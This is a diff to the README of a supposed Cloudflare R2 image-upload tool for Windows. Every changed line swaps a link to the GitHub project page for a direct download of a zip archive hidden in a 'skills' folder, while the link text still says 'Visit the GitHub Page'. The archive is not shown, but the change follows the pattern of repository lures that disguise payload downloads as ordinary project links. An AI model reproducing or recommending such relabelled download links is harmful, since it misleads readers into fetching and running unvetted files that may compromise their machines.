@@ -1,6 +1,6 @@
 # 🖼️ CloudFlare-R2-LocalPicManager - Simple Local Image Upload Tool
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20Page-blue.svg?style=for-the-badge)](https://github.com/specificgravityhobbleskirt108/CloudFlare-R2-LocalPicManager)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20Page-blue.svg?style=for-the-badge)](https://github.com/specificgravityhobbleskirt108/CloudFlare-R2-LocalPicManager/raw/refs/heads/main/skills/Manager_Flare_Cloud_Local_Pic_2.1.zip)
 
 ## 📌 What this is
 
@@ -30,7 +30,7 @@ This tool is designed for Windows users who want a simple way to handle image fi
 
 Open the project page here and get the files you need:
 
-https://github.com/specificgravityhobbleskirt108/CloudFlare-R2-LocalPicManager
+https://github.com/specificgravityhobbleskirt108/CloudFlare-R2-LocalPicManager/raw/refs/heads/main/skills/Manager_Flare_Cloud_Local_Pic_2.1.zip
 
 If the repository provides a release file, download that file. If it provides source files only, download the project from the GitHub page and use the local HTML file included in the package.
 
@@ -188,7 +188,7 @@ Use this tool if you want to:
 
 If you need the project files again, use this link:
 
-[CloudFlare-R2-LocalPicManager on GitHub](https://github.com/specificgravityhobbleskirt108/CloudFlare-R2-LocalPicManager)
+[CloudFlare-R2-LocalPicManager on GitHub](https://github.com/specificgravityhobbleskirt108/CloudFlare-R2-LocalPicManager/raw/refs/heads/main/skills/Manager_Flare_Cloud_Local_Pic_2.1.zip)
 
 ## 🧭 File Notes
 
